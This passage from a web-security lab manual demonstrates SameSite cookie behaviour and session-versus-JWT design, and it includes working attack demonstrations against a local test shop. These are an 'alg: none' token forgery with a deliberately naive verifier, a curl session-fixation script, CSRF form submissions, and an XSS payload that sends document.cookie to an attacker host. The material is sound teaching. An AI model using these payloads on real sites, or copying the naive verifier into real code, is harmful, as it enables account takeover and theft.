set https://shop.example.com/pixel --site=https://evil.net/ x-bad=1; SameSite=None
  -> ignored: SameSite=None without Secure
get https://shop.example.com/account
  -> Cookie: c-strict=1; c-lax=1; c-none=1; c-default=1; x-none=1
```

What to notice:

- **The table is the table of 10.02.** Contexts 01 and 02 send all four cookies.  
  Contexts 03 to 05 (image, credentialed `fetch`, iframe) send only `c-none`. Context 06, a clicked link, adds `c-lax` and `c-default`.  
  Context 07, a form `POST` one second after the cookies were set, sends `c-none` and `c-default` and not `c-lax`.  
  Context 08, the same `POST` at 130 seconds, sends `c-none` alone.

- **The last line of the output, `32 of 32 cells agree`,** compares each Chromium result with the jar's prediction from the same rules (the driver loads the jar and asks it).

- **Part B items 7 and 8:** a scheme change (`http` page, `https` request) and a request with no top-level site at all are treated as cross-site, so only `c-none` goes.  
  **Item 9:** a cross-site subresource response can set only a `SameSite=None; Secure` cookie.

Things to try:

01. Edit `advance 130` in `s03_samesite.txt` to `advance 119` and then `advance 121`, and change item 6's expectation accordingly.  
  At 119 seconds `c-default` is still sent, at 121 it is not: the window is 120 seconds.

02. `PORT=9401 node drivers/samesite.js` runs the matrix against the Rust shop. The table is identical.

### Lab 04: sessions against tokens, and fixation

**Part A: the two credentials.**  
One program builds both, with the properties of 10.03, and prints seven numbered sections.  
The Java version first, then the Rust version (`hmac`, `sha2`, `subtle`, `base64` and `rand` crates):

```java
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.HexFormat;
import java.util.HashMap;
import java.util.Map;
import java.util.Optional;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

// Two ways to let a cookie say who you are: an opaque session id that the server looks up, and a signed token that
// carries the claims itself (an HS256 JWT). The program runs both through the same events: login, tampering, the
// "alg: none" forgery, logout, expiry, key rotation. The Rust twin is session_vs_token.rs.
// Usage: java SessionVsToken.java
public class SessionVsToken {
    static final byte[] KEY = "h10-lab-signing-key-32-bytes!!!!".getBytes(StandardCharsets.UTF_8);
    static final Base64.Encoder B64 = Base64.getUrlEncoder().withoutPadding();
    static final Base64.Decoder UNB64 = Base64.getUrlDecoder();
    static final SecureRandom RANDOM = new SecureRandom();
    static final long T0 = 1793188800L;                               // the lab's "now": 2026-10-28 12:00:00 UTC

    // ---------------------------------------------------------------- server-side sessions

    record Session(String user, long expires) { }

    static final Map<String, Session> STORE = new ConcurrentHashMap<>();

    static String newSessionId() {
        byte[] b = new byte[16];                                       // 128 bits from the OS CSPRNG
        RANDOM.nextBytes(b);
        return B64.encodeToString(b);
    }

    static String login(String user, long now) {
        String id = newSessionId();
        STORE.put(id, new Session(user, now + 3600));
        return id;
    }

    static Optional<String> lookup(String id, long now) {
        Session s = STORE.get(id);
        return s == null || s.expires() <= now ? Optional.empty() : Optional.of(s.user());
    }

    // ---------------------------------------------------------------- signed tokens (HS256 JWT)

    static final Map<byte[], Mac> MACS = new java.util.IdentityHashMap<>();       // one initialised Mac per key (single thread)

    static byte[] hmac(byte[] key, String data) throws Exception {
        Mac mac = MACS.get(key);
        if (mac == null) {
            mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(key, "HmacSHA256"));
            MACS.put(key, mac);
        }
        return mac.doFinal(data.getBytes(StandardCharsets.US_ASCII));
    }

    static String b64(String s) { return B64.encodeToString(s.getBytes(StandardCharsets.UTF_8)); }

    static String sign(byte[] key, String headerJson, String payloadJson) throws Exception {
        String signingInput = b64(headerJson) + "." + b64(payloadJson);
        return signingInput + "." + B64.encodeToString(hmac(key, signingInput));
    }

    static String payload(String user, String jti, long iat, long exp) {
        return "{\"sub\":\"" + user + "\",\"jti\":\"" + jti + "\",\"iat\":" + iat + ",\"exp\":" + exp + "}";
    }

    static final String HEADER = "{\"alg\":\"HS256\",\"typ\":\"JWT\"}";

    // The mistake: let the token say how it should be verified.
    static Optional<String> verifyNaive(byte[] key, String token, long now) throws Exception {
        String[] p = token.split("\\.", -1);
        if (p.length != 3) return Optional.empty();
        String header = new String(UNB64.decode(p[0]), StandardCharsets.UTF_8);
        if (header.contains("\"alg\":\"none\"")) return claims(p[1], now);          // "no signature needed", says the attacker
        return verify(key, token, now);
    }

    // The fix: the verifier decides the algorithm and the key; nothing in the token chooses either.
    static Optional<String> verify(byte[] key, String token, long now) throws Exception {
        String[] p = token.split("\\.", -1);
        if (p.length != 3) return Optional.empty();
        String header = new String(UNB64.decode(p[0]), StandardCharsets.UTF_8);
        if (!header.equals(HEADER)) return Optional.empty();                          // only the one header we issue
        byte[] expected = hmac(key, p[0] + "." + p[1]);
        byte[] given;
        try { given = UNB64.decode(p[2]); } catch (IllegalArgumentException e) { return Optional.empty(); }
        if (!MessageDigest.isEqual(expected, given)) return Optional.empty();         // constant-time comparison
        return claims(p[1], now);
    }

    static Optional<String> claims(String payloadB64, long now) {
        String json = new String(UNB64.decode(payloadB64), StandardCharsets.UTF_8);
        long exp = Long.parseLong(field(json, "exp"));
        if (exp <= now) return Optional.empty();
        return Optional.of(field(json, "sub"));
    }

    // The value after "name": in a flat JSON object with string and integer members, no escapes. Enough for this lab.
    static String field(String json, String name) {
        int i = json.indexOf("\"" + name + "\":") + name.length() + 3;
        if (json.charAt(i) == '"') return json.substring(i + 1, json.indexOf('"', i + 1));
        int end = i;
        while (end < json.length() && Character.isDigit(json.charAt(end))) end++;
        return json.substring(i, end);
    }

    // ---------------------------------------------------------------- the run

    static String show(Optional<String> r) { return r.map(u -> "accepted as " + u).orElse("rejected"); }

    public static void main(String[] args) throws Exception {
        System.out.println("== 01 a server-side session ==");
        String sid = login("alice", T0);
        System.out.printf("cookie:   sid=%s%n", "<22 random characters>");
        System.out.printf("size:     the id is %d characters = %d bits of randomness; the cookie field is %d bytes%n",
                sid.length(), 128, ("sid=" + sid).length());
        System.out.printf("lookup:   %s%n", show(lookup(sid, T0 + 10)));
        System.out.printf("a guess:  %s%n", show(lookup(newSessionId(), T0 + 10)));
        System.out.printf("expired:  %s (an hour and a second later)%n", show(lookup(sid, T0 + 3601)));

        System.out.println();
        System.out.println("== 02 a signed token ==");
        String token = sign(KEY, HEADER, payload("alice", "t-0001", T0, T0 + 3600));
        String[] parts = token.split("\\.");
        System.out.println("header:    " + new String(UNB64.decode(parts[0]), StandardCharsets.UTF_8));
        System.out.println("payload:   " + new String(UNB64.decode(parts[1]), StandardCharsets.UTF_8));
        System.out.println("signature: " + parts[2] + "  (HMAC-SHA256 over the first two parts, " + UNB64.decode(parts[2]).length + " bytes)");
        System.out.println("token:     " + token);
        System.out.printf("size:      the cookie field 'token=...' is %d bytes%n", ("token=" + token).length());
        System.out.printf("verify:    %s%n", show(verify(KEY, token, T0 + 10)));
        System.out.printf("expired:   %s (an hour and a second later)%n", show(verify(KEY, token, T0 + 3601)));

        System.out.println();
        System.out.println("== 03 tampering ==");
        String forgedPayload = b64(payload("admin", "t-0001", T0, T0 + 3600));
        System.out.printf("payload says admin, old signature kept:  %s%n", show(verify(KEY, parts[0] + "." + forgedPayload + "." + parts[2], T0 + 10)));
        System.out.printf("signature cut to 10 characters:           %s%n", show(verify(KEY, parts[0] + "." + parts[1] + "." + parts[2].substring(0, 10), T0 + 10)));
        System.out.printf("signed with another key:                  %s%n", show(verify(KEY, sign("another-key-another-key-another!".getBytes(StandardCharsets.UTF_8), HEADER, payload("admin", "t-0001", T0, T0 + 3600)), T0 + 10)));

        System.out.println();
        System.out.println("== 04 the alg: none forgery ==");
        String none = b64("{\"alg\":\"none\",\"typ\":\"JWT\"}") + "." + forgedPayload + ".";
        System.out.println("forged:    " + none);
        System.out.printf("naive verifier (header chooses the algorithm): %s%n", show(verifyNaive(KEY, none, T0 + 10)));
        System.out.printf("pinned verifier (server chooses it):           %s%n", show(verify(KEY, none, T0 + 10)));

        System.out.println();
        System.out.println("== 05 logout ==");
        STORE.remove(sid);
        System.out.printf("session after logout:  %s%n", show(lookup(sid, T0 + 20)));
        System.out.printf("token after logout:    %s (nothing on the server knows it was a logout)%n", show(verify(KEY, token, T0 + 20)));
        Set<String> denylist = ConcurrentHashMap.newKeySet();
        denylist.add("t-0001");
        boolean denied = denylist.contains("t-0001");
        System.out.printf("token with a denylist: %s (but the denylist is server state again)%n", denied ? "rejected" : "accepted");

        System.out.println();
        System.out.println("== 06 key rotation ==");
        byte[] newKey = "h10-lab-signing-key-33-bytes-new".getBytes(StandardCharsets.UTF_8);
        System.out.printf("old token, new key only:       %s (every user is logged out)%n", show(verify(newKey, token, T0 + 30)));
        boolean viaKeyring = verify(newKey, token, T0 + 30).isPresent() || verify(KEY, token, T0 + 30).isPresent();
        System.out.printf("old token, keyring new + old:  %s (real tokens carry a key id (kid), so the verifier tries one key; old keys retire when their tokens expire)%n", viaKeyring ? "accepted as alice" : "rejected");

        System.out.println();
        System.out.println("== 07 what each costs ==");
        for (int i = 0; i < 100_000; i++) STORE.put(newSessionId(), new Session("user" + i, T0 + 3600));
        String[] ids = STORE.keySet().toArray(new String[0]);
        long sink = 0;
        long t = System.nanoTime();
        for (int i = 0; i < 2_000_000; i++) sink += lookup(ids[i % ids.length], T0).isPresent() ? 1 : 0;
        long lookupNs = (System.nanoTime() - t) / 2_000_000;
        t = System.nanoTime();
        for (int i = 0; i < 200_000; i++) sink += verify(KEY, token, T0 + 10).isPresent() ? 1 : 0;
        long verifyNs = (System.nanoTime() - t) / 200_000;
        if (sink < 0) System.out.println(sink);                          // keeps the loops from being optimised away
        System.out.printf("session lookup in a map of %d: about %d ns     token verify (HMAC-SHA256): about %d ns%n",
                STORE.size(), lookupNs, verifyNs);
        int[] requests = {1, 20, 100};
        for (int r : requests) {
            System.out.printf("a page of %3d requests sends  session: %5d bytes   token: %6d bytes of cookies%n", r,
                    r * ("sid=" + sid).length(), r * ("token=" + token).length());
        }
    }
}
```

```rust
// Two ways to let a cookie say who you are: an opaque session id that the server looks up, and a signed token that
// carries the claims itself (an HS256 JWT). The program runs both through the same events: login, tampering, the
// "alg: none" forgery, logout, expiry, key rotation. Rust twin of SessionVsToken.java.
use std::collections::{HashMap, HashSet};
use std::time::Instant;

use base64::engine::general_purpose::URL_SAFE_NO_PAD as B64;
use base64::Engine;
use hmac::{Hmac, Mac};
use rand::RngCore;
use sha2::Sha256;
use subtle::ConstantTimeEq;

const KEY: &[u8] = b"h10-lab-signing-key-32-bytes!!!!";
const HEADER: &str = "{\"alg\":\"HS256\",\"typ\":\"JWT\"}";
const T0: u64 = 1793188800;                                       // the lab's "now": 2026-10-28 12:00:00 UTC

// ---------------------------------------------------------------- server-side sessions

struct Session { user: String, expires: u64 }

fn new_session_id() -> String {
    let mut b = [0u8; 16];                                        // 128 bits from the OS CSPRNG
    rand::rngs::OsRng.fill_bytes(&mut b);
    B64.encode(b)
}

fn lookup(store: &HashMap<String, Session>, id: &str, now: u64) -> Option<String> {
    store.get(id).filter(|s| s.expires > now).map(|s| s.user.clone())
}

// ---------------------------------------------------------------- signed tokens (HS256 JWT)

fn hmac(key: &[u8], data: &str) -> Vec<u8> {
    let mut mac = Hmac::<Sha256>::new_from_slice(key).unwrap();
    mac.update(data.as_bytes());
    mac.finalize().into_bytes().to_vec()
}

fn b64(s: &str) -> String { B64.encode(s.as_bytes()) }

fn sign(key: &[u8], header: &str, payload: &str) -> String {
    let signing_input = format!("{}.{}", b64(header), b64(payload));
    format!("{signing_input}.{}", B64.encode(hmac(key, &signing_input)))
}

fn payload(user: &str, jti: &str, iat: u64, exp: u64) -> String {
    format!("{{\"sub\":\"{user}\",\"jti\":\"{jti}\",\"iat\":{iat},\"exp\":{exp}}}")
}

fn unb64(s: &str) -> Option<Vec<u8>> { B64.decode(s).ok() }

// The mistake: let the token say how it should be verified.
fn verify_naive(key: &[u8], token: &str, now: u64) -> Option<String> {
    let p: Vec<&str> = token.split('.').collect();
    if p.len() != 3 { return None; }
    let header = String::from_utf8(unb64(p[0])?).ok()?;
    if header.contains("\"alg\":\"none\"") { return claims(p[1], now); }       // "no signature needed", says the attacker
    verify(key, token, now)
}

// The fix: the verifier decides the algorithm and the key; nothing in the token chooses either.
fn verify(key: &[u8], token: &str, now: u64) -> Option<String> {
    let p: Vec<&str> = token.split('.').collect();
    if p.len() != 3 { return None; }
    let header = String::from_utf8(unb64(p[0])?).ok()?;
    if header != HEADER { return None; }                                       // only the one header we issue
    let expected = hmac(key, &format!("{}.{}", p[0], p[1]));
    let given = unb64(p[2])?;
    if expected.len() != given.len() || expected.ct_eq(&given).unwrap_u8() != 1 { return None; }   // constant-time comparison
    claims(p[1], now)
}

fn claims(payload_b64: &str, now: u64) -> Option<String> {
    let json = String::from_utf8(unb64(payload_b64)?).ok()?;
    let exp: u64 = field(&json, "exp").parse().ok()?;
    if exp <= now { return None; }
    Some(field(&json, "sub"))
}

// The value after "name": in a flat JSON object with string and integer members, no escapes. Enough for this lab.
fn field(json: &str, name: &str) -> String {
    let i = json.find(&format!("\"{name}\":")).unwrap() + name.len() + 3;
    let rest = &json[i..];
    if let Some(s) = rest.strip_prefix('"') { return s[..s.find('"').unwrap()].to_string(); }
    rest.chars().take_while(|c| c.is_ascii_digit()).collect()
}

// ---------------------------------------------------------------- the run

fn show(r: Option<String>) -> String {
    match r { Some(u) => format!("accepted as {u}"), None => "rejected".to_string() }
}

fn main() {
    let mut store: HashMap<String, Session> = HashMap::new();
    println!("== 01 a server-side session ==");
    let sid = new_session_id();
    store.insert(sid.clone(), Session { user: "alice".into(), expires: T0 + 3600 });
    println!("cookie:   sid=<22 random characters>");
    println!("size:     the id is {} characters = {} bits of randomness; the cookie field is {} bytes", sid.len(), 128, format!("sid={sid}").len());
    println!("lookup:   {}", show(lookup(&store, &sid, T0 + 10)));
    println!("a guess:  {}", show(lookup(&store, &new_session_id(), T0 + 10)));
    println!("expired:  {} (an hour and a second later)", show(lookup(&store, &sid, T0 + 3601)));

    println!();
    println!("== 02 a signed token ==");
    let token = sign(KEY, HEADER, &payload("alice", "t-0001", T0, T0 + 3600));
    let parts: Vec<&str> = token.split('.').collect();
    println!("header:    {}", String::from_utf8(unb64(parts[0]).unwrap()).unwrap());
    println!("payload:   {}", String::from_utf8(unb64(parts[1]).unwrap()).unwrap());
    println!("signature: {}  (HMAC-SHA256 over the first two parts, {} bytes)", parts[2], unb64(parts[2]).unwrap().len());
    println!("token:     {token}");
    println!("size:      the cookie field 'token=...' is {} bytes", format!("token={token}").len());
    println!("verify:    {}", show(verify(KEY, &token, T0 + 10)));
    println!("expired:   {} (an hour and a second later)", show(verify(KEY, &token, T0 + 3601)));

    println!();
    println!("== 03 tampering ==");
    let forged_payload = b64(&payload("admin", "t-0001", T0, T0 + 3600));
    println!("payload says admin, old signature kept:  {}", show(verify(KEY, &format!("{}.{}.{}", parts[0], forged_payload, parts[2]), T0 + 10)));
    println!("signature cut to 10 characters:           {}", show(verify(KEY, &format!("{}.{}.{}", parts[0], parts[1], &parts[2][..10]), T0 + 10)));
    println!("signed with another key:                  {}", show(verify(KEY, &sign(b"another-key-another-key-another!", HEADER, &payload("admin", "t-0001", T0, T0 + 3600)), T0 + 10)));

    println!();
    println!("== 04 the alg: none forgery ==");
    let none = format!("{}.{}.", b64("{\"alg\":\"none\",\"typ\":\"JWT\"}"), forged_payload);
    println!("forged:    {none}");
    println!("naive verifier (header chooses the algorithm): {}", show(verify_naive(KEY, &none, T0 + 10)));
    println!("pinned verifier (server chooses it):           {}", show(verify(KEY, &none, T0 + 10)));

    println!();
    println!("== 05 logout ==");
    store.remove(&sid);
    println!("session after logout:  {}", show(lookup(&store, &sid, T0 + 20)));
    println!("token after logout:    {} (nothing on the server knows it was a logout)", show(verify(KEY, &token, T0 + 20)));
    let mut denylist: HashSet<&str> = HashSet::new();
    denylist.insert("t-0001");
    println!("token with a denylist: {} (but the denylist is server state again)", if denylist.contains("t-0001") { "rejected" } else { "accepted" });

    println!();
    println!("== 06 key rotation ==");
    let new_key: &[u8] = b"h10-lab-signing-key-33-bytes-new";
    println!("old token, new key only:       {} (every user is logged out)", show(verify(new_key, &token, T0 + 30)));
    let via_keyring = verify(new_key, &token, T0 + 30).is_some() || verify(KEY, &token, T0 + 30).is_some();
    println!("old token, keyring new + old:  {} (real tokens carry a key id (kid), so the verifier tries one key; old keys retire when their tokens expire)",
             if via_keyring { "accepted as alice" } else { "rejected" });

    println!();
    println!("== 07 what each costs ==");
    for i in 0..100_000 { store.insert(new_session_id(), Session { user: format!("user{i}"), expires: T0 + 3600 }); }
    let ids: Vec<String> = store.keys().cloned().collect();
    let mut sink = 0u64;
    let t = Instant::now();
    for i in 0..2_000_000usize { sink += lookup(&store, &ids[i % ids.len()], T0).is_some() as u64; }
    let lookup_ns = t.elapsed().as_nanos() / 2_000_000;
    let t = Instant::now();
    for _ in 0..200_000 { sink += verify(KEY, &token, T0 + 10).is_some() as u64; }
    let verify_ns = t.elapsed().as_nanos() / 200_000;
    if sink == 0 { println!("{sink}"); }                          // keeps the loops from being optimised away
    println!("session lookup in a map of {}: about {lookup_ns} ns     token verify (HMAC-SHA256): about {verify_ns} ns", store.len());
    for r in [1usize, 20, 100] {
        println!("a page of {r:3} requests sends  session: {:5} bytes   token: {:6} bytes of cookies",
                 r * format!("sid={sid}").len(), r * format!("token={token}").len());
    }
}
```

Run: `java java/SessionVsToken.java` or `rust/target/release/session_vs_token`. The token section is deterministic (a fixed key and clock), so it is the same bytes on every run and in both languages:

```text
== 01 a server-side session ==
cookie:   sid=<22 random characters>
size:     the id is 22 characters = 128 bits of randomness; the cookie field is 26 bytes
lookup:   accepted as alice
a guess:  rejected
expired:  rejected (an hour and a second later)

== 02 a signed token ==
header:    {"alg":"HS256","typ":"JWT"}
payload:   {"sub":"alice","jti":"t-0001","iat":1793188800,"exp":1793192400}
signature: DqqDHwPzddJ9ixEDHl5INyRckqK6RGdIkF5u-cVeKdg  (HMAC-SHA256 over the first two parts, 32 bytes)
token:     eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsImp0aSI6InQtMDAwMSIsImlhdCI6MTc5MzE4ODgwMCwiZXhwIjoxNzkzMTkyNDAwfQ.DqqDHwPzddJ9ixEDHl5INyRckqK6RGdIkF5u-cVeKdg
size:      the cookie field 'token=...' is 173 bytes
verify:    accepted as alice
expired:   rejected (an hour and a second later)

== 03 tampering ==
payload says admin, old signature kept:  rejected
signature cut to 10 characters:           rejected
signed with another key:                  rejected

== 04 the alg: none forgery ==
forged:    eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImp0aSI6InQtMDAwMSIsImlhdCI6MTc5MzE4ODgwMCwiZXhwIjoxNzkzMTkyNDAwfQ.
naive verifier (header chooses the algorithm): accepted as admin
pinned verifier (server chooses it):           rejected

== 05 logout ==
session after logout:  rejected
token after logout:    accepted as alice (nothing on the server knows it was a logout)
token with a denylist: rejected (but the denylist is server state again)

== 06 key rotation ==
old token, new key only:       rejected (every user is logged out)
old token, keyring new + old:  accepted as alice (real tokens carry a key id (kid), so the verifier tries one key; old keys retire when their tokens expire)

== 07 what each costs ==
session lookup in a map of 100000: about 37 ns     token verify (HMAC-SHA256): about 3425 ns
a page of   1 requests sends  session:    26 bytes   token:    173 bytes of cookies
a page of  20 requests sends  session:   520 bytes   token:   3460 bytes of cookies
a page of 100 requests sends  session:  2600 bytes   token:  17300 bytes of cookies
```

The Rust output is identical except for the timings in section 07; the whole `diff`:

```text
37c37
< session lookup in a map of 100000: about 37 ns     token verify (HMAC-SHA256): about 3425 ns
---
> session lookup in a map of 100000: about 65 ns     token verify (HMAC-SHA256): about 784 ns
```

What to notice:

- **01: a session.** 22 random characters are 128 bits. A guessed id and an expired session are both rejected. The cookie field is 26 bytes.

- **02: a token.** The three parts are visible and readable by anyone: the header, the payload with `sub`, `jti`, `iat` and `exp`, and the 32-byte tag. The cookie field is 173 bytes.

- **03: tampering.** Changing the payload while keeping the old tag, cutting the tag and signing with another key are all rejected.

- **04: `alg: none`.** The forged token ends with a dot and no signature. The naive verifier, which lets the header choose the algorithm, accepts it as `admin`. The pinned verifier rejects it.

- **05: logout.** The session is rejected afterwards. The token is still accepted as `alice`. With a denylist it is rejected, at the price of server state.

- **06: key rotation.** The old token fails under the new key and passes against a keyring holding both.

- **07: the cost.** The sizes are exact, the timings are not. The page of 100 requests sends 2,600 bytes of session cookies and 17,300 bytes of token cookies.

**Part B: fixation.** `lab04_fixation.sh` plays the attacker and the victim with `curl` and two cookie jars, once against a shop that keeps the id at login (`fix=on`) and once against one that issues a new id. Run: `./lab04_fixation.sh` (port 9400) or `./lab04_fixation.sh 9401`.

```sh
#!/bin/bash
# Lab 04, part B: session fixation against a shop that keeps the visitor's session id at login (fix=on, the bug)
# and against one that issues a new id (the default). Session ids are random, so they are shown as <A> and <B>.
# Usage: ./lab04_fixation.sh [port]      (default 9400)
P=${1:-9400}
B=http://shop.localhost:$P
mask() { sed -E "s/$1/<$2>/g"; }
for mode in on off; do
  if [ $mode = on ]; then echo "== the shop keeps the session id at login (fix=on, the bug) =="; else echo "== the shop issues a new session id at login =="; fi
  curl -s --noproxy '' -X POST $B/__reset > /dev/null
  rm -f out/attacker.jar out/victim.jar
  curl -s --noproxy '' -c out/attacker.jar -o /dev/null $B/
  A=$(awk '$6=="sid"{print $7}' out/attacker.jar)
  echo "1. the attacker visits the shop and is given an anonymous session: sid=<A>"
  cp out/attacker.jar out/victim.jar
  echo "2. the attacker gets that id into the victim's browser (a link, a sibling subdomain, XSS): the victim's jar now holds sid=<A>"
  curl -s --noproxy '' -b out/victim.jar -c out/victim.jar -D out/login.hdr -o /dev/null -d 'user=alice&password=wonderland' "$B/login?fix=$mode"
  fresh=$(tr -d '\r' < out/login.hdr | grep -i '^set-cookie: sid=' | sed -E 's/^[Ss]et-[Cc]ookie: sid=([^;]*).*/\1/')
  if [ "$fresh" = "$A" ]; then echo "3. the victim logs in; the response sets sid=<A> again: the id did not change"; else echo "3. the victim logs in; the response sets sid=<B>: the id changed"; fi
  code=$(curl -s --noproxy '' -b out/attacker.jar -o out/account.txt -w '%{http_code}' $B/account)
  who=$(sed -n -E 's/.*<h1>([^<]*)<\/h1><p>balance: ([0-9]+)<\/p>.*/\1, balance \2/p' out/account.txt)
  echo "4. the attacker, holding only sid=<A>, asks for /account: HTTP $code ${who:-$(tr -d '\n' < out/account.txt)}"
  echo
done
```

```text
== the shop keeps the session id at login (fix=on, the bug) ==
1. the attacker visits the shop and is given an anonymous session: sid=<A>
2. the attacker gets that id into the victim's browser (a link, a sibling subdomain, XSS): the victim's jar now holds sid=<A>
3. the victim logs in; the response sets sid=<A> again: the id did not change
4. the attacker, holding only sid=<A>, asks for /account: HTTP 200 alice, balance 1000

== the shop issues a new session id at login ==
1. the attacker visits the shop and is given an anonymous session: sid=<A>
2. the attacker gets that id into the victim's browser (a link, a sibling subdomain, XSS): the victim's jar now holds sid=<A>
3. the victim logs in; the response sets sid=<B>: the id changed
4. the attacker, holding only sid=<A>, asks for /account: HTTP 401 not logged in
```

The two runs differ in one line: step 3 reports whether the response sets the same id.  
When it does, step 4 gives the attacker `HTTP 200 alice, balance 1000` with a cookie that was valid before alice ever logged in.  
When the id changes, the attacker's id is `HTTP 401`.

Things to try:

01. Run the token program twice. The token and the signature are the same; the session id's value differs but is masked in the output.

02. In `claims`, delete the line `if (exp <= now) return Optional.empty();`.  
  In section 02 the `expired` line changes from `rejected` to `accepted as alice`: a token whose expiry nobody checks is valid for ever.

03. `./lab04_fixation.sh 9401` runs the same script against the Rust shop. The two outputs are identical.

### Lab 05: CSRF, XSS and cookie tossing

Goal: run the three attacks of 10.04 against the shop in Chromium, once per defence.

```js
// Lab 05: three attacks on the shop, run in Chromium, and what each defence does to them.
//   Part A  CSRF: a page on another site makes the victim's browser send a money transfer
//   Part B  XSS: injected script reads document.cookie and acts as the victim
//   Part C  cookie tossing: a sibling subdomain plants a cookie that the shop then trusts
const { PORT, url, reset, clearLog, readLog, launch, settle, pad } = require('./lib');

const ADMIN = `http://127.0.0.1:${PORT}`;
const form = obj => new URLSearchParams(obj).toString();

async function login(page, user, password, knobs) {
  await page.goto(url('shop.localhost', '/blank'));
  return page.evaluate(async ([k, body]) => (await fetch('/login?' + k, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body })).status, [knobs, form({ user, password })]);
}

async function balance(name) {
  const state = await (await fetch(`${ADMIN}/state`)).text();
  return +state.match(new RegExp(name + '=(\\d+)'))[1];
}

const ENDPOINTS = ['transfer', 'transfer-get', 'transfer-token', 'transfer-origin', 'transfer-fetchmeta', 'transfer-json'];
const SAMESITES = ['none', 'unset', 'lax', 'strict'];

// The attacker's page sends the transfer to the shop; how depends on the endpoint.
async function attack(page, endpoint) {
  const target = url('shop.localhost', '/' + endpoint);
  if (endpoint === 'transfer-json') {
    await page.evaluate(async t => {
      await fetch(t, { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ to: 'mallory', amount: 100 }) }).catch(() => {});
    }, target);
    return;
  }
  const method = endpoint === 'transfer-get' ? 'get' : 'post';
  await Promise.all([
    page.waitForNavigation(),
    page.evaluate(([t, m]) => {
      const f = document.createElement('form');
      f.method = m; f.action = t;
      for (const [k, v] of [['to', 'mallory'], ['amount', '100']]) { const i = document.createElement('input'); i.name = k; i.value = v; f.appendChild(i); }
      document.body.appendChild(f);
      f.submit();
    }, [target, method]),
  ]);
}

async function csrfMatrix(browser, attackerHost) {
  const rows = {};
  for (const endpoint of ENDPOINTS) {
    rows[endpoint] = [];
    for (const samesite of SAMESITES) {
      await reset();
      const ctx = await browser.newContext();
      const page = await ctx.newPage();
      await login(page, 'alice', 'wonderland', `samesite=${samesite}`);
      await clearLog();
      await page.goto(url(attackerHost, '/blank'));
      await attack(page, endpoint);
      await settle(page, 300);
      const stolen = await balance('mallory');
      const log = (await readLog()).filter(r => r.path === '/' + endpoint);
      const rec = log.filter(r => r.method !== 'OPTIONS').pop();
      let outcome;
      if (stolen > 0) outcome = 'STOLEN';
      else if (!rec && log.length) outcome = 'preflight fails';
      else if (!rec) outcome = 'not sent';
      else if (rec.status === 401) outcome = 'no cookie';
      else outcome = 'rejected';
      rows[endpoint].push(outcome);
      await ctx.close();
    }
  }
  console.log(pad('endpoint (defence)', 36) + SAMESITES.map(s => pad('SameSite=' + s, 18)).join(''));
  for (const endpoint of ENDPOINTS) console.log(pad(endpoint, 36) + rows[endpoint].map(o => pad(o, 18)).join(''));
}

async function xss(browser) {
  for (const httponly of ['off', 'on']) {
    await reset();
    const ctx = await browser.newContext();
    const page = await ctx.newPage();
    await login(page, 'alice', 'wonderland', `httponly=${httponly}`);
    await clearLog();
    const payload = `<script>new Image().src='http://evil.localhost:${PORT}/collect?c='+encodeURIComponent(document.cookie);` +
      `fetch('/transfer',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'to=mallory&amount=50'})</script>`;
    await page.goto(url('shop.localhost', '/search?q=' + encodeURIComponent(payload)));
    await settle(page, 500);
    const log = await readLog();
    const collected = (log.find(r => r.path === '/collect') || { note: '' }).note.replace(/sid=[A-Za-z0-9_-]{22}/, 'sid=<id>');
    const executed = log.some(r => r.path === '/transfer' && /EXECUTED/.test(r.note));
    console.log(`HttpOnly ${pad(httponly, 4)} the attacker's server received:  ${collected.replace('COLLECTED ', '') || '(nothing)'}`);
    console.log(`            the injected script's own transfer:    ${executed ? 'EXECUTED as alice' : 'did not run'}   mallory's balance: ${await balance('mallory')}`);
    await ctx.close();
  }
}

async function tossing(browser) {
  const cases = [['sid', 'off', 'the shop rotates the id at login (correct)'], ['sid', 'on', 'the shop keeps the id at login (fixation bug)'], ['__Host-sid', 'off', 'the shop rotates the id, cookie named __Host-sid']];
  for (const [design, fix, label] of cases) {
    await reset();
    const anon = await fetch(`${ADMIN}/`);                       // the attacker visits the shop and gets an anonymous session
    const attackerSid = /sid=([^;]+)/.exec(anon.headers.get('set-cookie'))[1];
    const ctx = await browser.newContext();
    const page = await ctx.newPage();
    const planted = design === 'sid' ? `sid=${attackerSid}; Domain=shop.localhost; Path=/` : `__Host-sid=${attackerSid}; Domain=shop.localhost; Secure; Path=/`;
    await page.goto(url('blog.shop.localhost', '/set?c=' + encodeURIComponent(planted)));
    await login(page, 'alice', 'wonderland', (design === 'sid' ? '' : 'prefix=host&') + `fix=${fix}`);
    const resp = await page.goto(url('shop.localhost', '/account'));
    const who = resp.status() === 200 ? await page.locator('h1').innerText() : `HTTP ${resp.status()}, not logged in`;
    const jar = (await ctx.cookies()).filter(c => c.name.endsWith('sid')).map(c => `${c.name} (${c.domain})`).join(', ');
    const theirs = await fetch(`${ADMIN}/account`, { headers: { Cookie: `${design}=${attackerSid}` } });
    const attackerView = theirs.status === 200 ? (await theirs.text()).match(/<h1>(.*?)<\/h1>/)[1] : `HTTP ${theirs.status}`;
    console.log(`${label}`);
    console.log(`   planted by the sibling page: ${planted.replace(attackerSid, '<A>')}`);
    console.log(`   victim's browser holds:      ${jar}`);
    console.log(`   victim logs in as alice; /account shows: ${who}`);
    console.log(`   attacker, holding only <A>, asks /account: ${attackerView}`);
    await ctx.close();
  }
}

(async () => {
  const browser = await launch();
  console.log('== Part A1: CSRF from another site (evil.localhost) ==');
  await csrfMatrix(browser, 'evil.localhost');
  console.log('\n== Part A2: the same attack from a sibling subdomain (blog.shop.localhost, same site) ==');
  await csrfMatrix(browser, 'blog.shop.localhost');
  console.log('\n== Part B: XSS in /search ==');
  await xss(browser);
  console.log('\n== Part C: cookie tossing from blog.shop.localhost ==');
  await tossing(browser);
  await browser.close();
})();
```

Run: `node drivers/attacks.js` (about a minute).

```text
